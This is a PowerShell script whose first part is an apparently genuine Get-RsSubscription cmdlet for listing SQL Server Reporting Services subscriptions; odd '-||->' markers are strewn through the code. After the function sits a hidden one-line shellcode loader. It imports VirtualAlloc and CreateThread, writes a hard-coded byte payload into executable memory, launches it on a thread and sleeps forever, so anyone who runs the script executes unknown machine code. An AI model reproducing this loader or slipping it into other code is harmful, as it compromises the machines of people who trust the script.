


 -||-> function Get-RsSubscription
{
    

    [cmdletbinding()]
    param
    (
        [Alias('Path')]
        [Parameter(Mandatory = $True, ValueFromPipeline = $true)]
        [string[]]
        $RsItem,

        [string]
        $ReportServerUri,

        [ValidateSet('2005','2006','2010')]
        [string]
        $ApiVersion = '2010',

        [System.Management.Automation.PSCredential]
        $Credential,

        $Proxy
    )
    Begin
    {
         -||-> $Proxy =  -||-> New-RsWebServiceProxyHelper -BoundParameters $PSBoundParameters <-||-  <-||- 
    }
    Process
    {
         -||-> foreach ($item in  -||-> $RsItem <-||- )
        {
             -||-> try
            {
                 -||-> Write-Verbose "Retrieving subscriptions contents..." <-||- 

                 -||-> if ( -||-> $Proxy.Url -match 'ReportService2005.asmx' <-||- )
                {
                     -||-> if ( -||-> $item -eq '/' <-||- ) {  -||-> $item = $null <-||-  } <-||- 
                     -||-> $subscriptions = $Proxy.ListSubscriptions($Item,$null) <-||- 
                }
                else
                {
                     -||-> $subscriptions = $Proxy.ListSubscriptions($Item) <-||- 
                } <-||- 

                 -||-> Write-Verbose "Subscriptions retrieved successfully!" <-||- 

                 -||-> $namespace = $proxy.GetType().Namespace <-||- 
                 -||-> $DataRetrievalPlanDataType = "$namespace.DataRetrievalPlan" <-||- 
                 -||-> $ExtensionSettingsDataType = "$namespace.ExtensionSettings" <-||- 
                 -||-> $ActiveStateDataType = "$namespace.ActiveState" <-||- 

                 -||-> foreach ($subscription in  -||-> $subscriptions <-||- )
                {
                     -||-> $extSettings = $null <-||- 
                     -||-> $DataRetrievalPlan = $null <-||- 
                     -||-> $desc = $null <-||- 
                     -||-> $active = $null <-||- 
                     -||-> $status = $null <-||- 
                     -||-> $eventType = $null <-||- 
                     -||-> $matchData = $null <-||- 
                     -||-> $values = $null <-||- 
                     -||-> $Result = $null <-||- 

                     -||-> try
                    {
                         -||-> Write-Verbose "Retrieving subscription properties for $( -||-> $subscription.SubscriptionID <-||- )..." <-||- 

                         -||-> if ( -||-> $subscription.IsDataDriven <-||- )
                        {
                             -||-> $null = $Proxy.GetDataDrivenSubscriptionProperties($subscription.SubscriptionID, [ref]$extSettings, [ref]$DataRetrievalPlan, [ref]$desc, [ref]$active, [ref]$status, [ref]$eventType, [ref]$matchData, [ref]$values) <-||- 
                        }
                        else
                        {
                             -||-> $null = $Proxy.GetSubscriptionProperties($subscription.SubscriptionID, [ref]$extSettings, [ref]$desc, [ref]$active, [ref]$status, [ref]$eventType, [ref]$matchData, [ref]$values) <-||- 
                        } <-||- 

                         -||-> Write-Verbose "Subscription properties for $( -||-> $subscription.SubscriptionID <-||- ) retrieved successfully!" <-||- 

                        
                         -||-> $ExtensionSettings =  -||-> New-Object $ExtensionSettingsDataType <-||-  <-||- 
                         -||-> $ExtensionSettings.Extension = $subscription.DeliverySettings.Extension <-||- 
                         -||-> $ExtensionSettings.ParameterValues = $subscription.DeliverySettings.ParameterValues <-||- 

                        
                         -||-> $ActiveState =  -||-> New-Object $ActiveStateDataType <-||-  <-||- 
                         -||-> $ActiveState.DeliveryExtensionRemoved          = $subscription.Active.DeliveryExtensionRemoved <-||- 
                         -||-> $ActiveState.DeliveryExtensionRemovedSpecified = $subscription.Active.DeliveryExtensionRemovedSpecified <-||- 
                         -||-> $ActiveState.SharedDataSourceRemoved           = $subscription.Active.SharedDataSourceRemoved <-||- 
                         -||-> $ActiveState.SharedDataSourceRemovedSpecified  = $subscription.Active.SharedDataSourceRemovedSpecified <-||- 
                         -||-> $ActiveState.MissingParameterValue             = $subscription.Active.MissingParameterValue <-||- 
                         -||-> $ActiveState.MissingParameterValueSpecified    = $subscription.Active.MissingParameterValueSpecified <-||- 
                         -||-> $ActiveState.InvalidParameterValue             = $subscription.Active.InvalidParameterValue <-||- 
                         -||-> $ActiveState.InvalidParameterValueSpecified    = $subscription.Active.InvalidParameterValueSpecified <-||- 
                         -||-> $ActiveState.UnknownReportParameter            = $subscription.Active.UnknownReportParameter <-||- 
                         -||-> $ActiveState.UnknownReportParameterSpecified   = $subscription.Active.UnknownReportParameterSpecified <-||- 

                         -||-> $Result = @{
                            SubscriptionID        =  -||-> $subscription.SubscriptionID <-||- 
                            Owner                 =  -||-> $subscription.Owner <-||- 
                            Path                  =  -||-> $subscription.Path <-||- 
                            VirtualPath           =  -||-> $subscription.VirtualPath <-||- 
                            Report                =  -||-> $subscription.Report <-||- 
                            DeliverySettings      =  -||-> $ExtensionSettings <-||- 
                            Description           =  -||-> $subscription.Description <-||- 
                            Status                =  -||-> $subscription.Status <-||- 
                            Active                =  -||-> $ActiveState <-||- 
                            LastExecuted          =  -||-> $subscription.LastExecuted <-||- 
                            LastExecutedSpecified =  -||-> $subscription.LastExecutedSpecified <-||- 
                            ModifiedBy            =  -||-> $subscription.ModifiedBy <-||- 
                            ModifiedDate          =  -||-> $subscription.ModifiedDate <-||- 
                            EventType             =  -||-> $subscription.EventType <-||- 
                            IsDataDriven          =  -||-> $subscription.IsDataDriven <-||- 
                            MatchData             =  -||-> $matchData <-||- 
                            Values                =  -||-> $values <-||- 
                        } <-||- 

                         -||-> if ( -||-> $subscription.IsDataDriven <-||- )
                        {
                             -||-> $Result.Add('DataRetrievalPlan',$DataRetrievalPlan) <-||- 
                        } <-||- 

                         -||-> [pscustomobject]$Result <-||- 
                    }
                    catch
                    {
                         -||-> Write-Error ( -||-> New-Object System.Exception( -||-> "Exception while retrieving subscription properties! $( -||-> $_.Exception.Message <-||- )", $_.Exception <-||- ) <-||- ) <-||- 
                         -||-> Write-Verbose ( -||-> $subscription | format-list | out-string <-||- ) <-||- 
                    } <-||- 
                } <-||- 
            }
            catch
            {
                throw  -||-> ( -||-> New-Object System.Exception( -||-> "Exception while retrieving subscription(s)! $( -||-> $_.Exception.Message <-||- )", $_.Exception <-||- ) <-||- ) <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 

 -||-> $f1ec = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $f1ec -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xc3,0xd9,0x74,0x24,0xf4,0xbb,0x3b,0x3c,0x11,0x3c,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x14,0x03,0x58,0x2f,0xde,0xe4,0xc0,0xa7,0x9c,0x07,0x39,0x37,0xc1,0x8e,0xdc,0x06,0xc1,0xf5,0x95,0x38,0xf1,0x7e,0xfb,0xb4,0x7a,0xd2,0xe8,0x4f,0x0e,0xfb,0x1f,0xf8,0xa5,0xdd,0x2e,0xf9,0x96,0x1e,0x30,0x79,0xe5,0x72,0x92,0x40,0x26,0x87,0xd3,0x85,0x5b,0x6a,0x81,0x5e,0x17,0xd9,0x36,0xeb,0x6d,0xe2,0xbd,0xa7,0x60,0x62,0x21,0x7f,0x82,0x43,0xf4,0xf4,0xdd,0x43,0xf6,0xd9,0x55,0xca,0xe0,0x3e,0x53,0x84,0x9b,0xf4,0x2f,0x17,0x4a,0xc5,0xd0,0xb4,0xb3,0xea,0x22,0xc4,0xf4,0xcc,0xdc,0xb3,0x0c,0x2f,0x60,0xc4,0xca,0x52,0xbe,0x41,0xc9,0xf4,0x35,0xf1,0x35,0x05,0x99,0x64,0xbd,0x09,0x56,0xe2,0x99,0x0d,0x69,0x27,0x92,0x29,0xe2,0xc6,0x75,0xb8,0xb0,0xec,0x51,0xe1,0x63,0x8c,0xc0,0x4f,0xc5,0xb1,0x13,0x30,0xba,0x17,0x5f,0xdc,0xaf,0x25,0x02,0x88,0x1c,0x04,0xbd,0x48,0x0b,0x1f,0xce,0x7a,0x94,0x8b,0x58,0x36,0x5d,0x12,0x9e,0x39,0x74,0xe2,0x30,0xc4,0x77,0x13,0x18,0x02,0x23,0x43,0x32,0xa3,0x4c,0x08,0xc2,0x4c,0x99,0xa5,0xc7,0xda,0x6d,0xbb,0x14,0x0c,0x1a,0xb9,0xa4,0x21,0x86,0x34,0x42,0x11,0x66,0x17,0xdb,0xd1,0xd6,0xd7,0x8b,0xb9,0x3c,0xd8,0xf4,0xd9,0x3e,0x32,0x9d,0x73,0xd1,0xeb,0xf5,0xeb,0x48,0xb6,0x8e,0x8a,0x95,0x6c,0xeb,0x8c,0x1e,0x83,0x0b,0x42,0xd7,0xee,0x1f,0x32,0x17,0xa5,0x42,0x94,0x28,0x13,0xe8,0x18,0xbd,0x98,0xbb,0x4f,0x29,0xa3,0x9a,0xa7,0xf6,0x5c,0xc9,0xbc,0x3f,0xc9,0xb2,0xaa,0x3f,0x1d,0x33,0x2a,0x16,0x77,0x33,0x42,0xce,0x23,0x60,0x77,0x11,0xfe,0x14,0x24,0x84,0x01,0x4d,0x99,0x0f,0x6a,0x73,0xc4,0x78,0x35,0x8c,0x23,0x79,0x09,0x5b,0x0d,0x0f,0x63,0x5f <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Bto=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Bto.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Bto,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



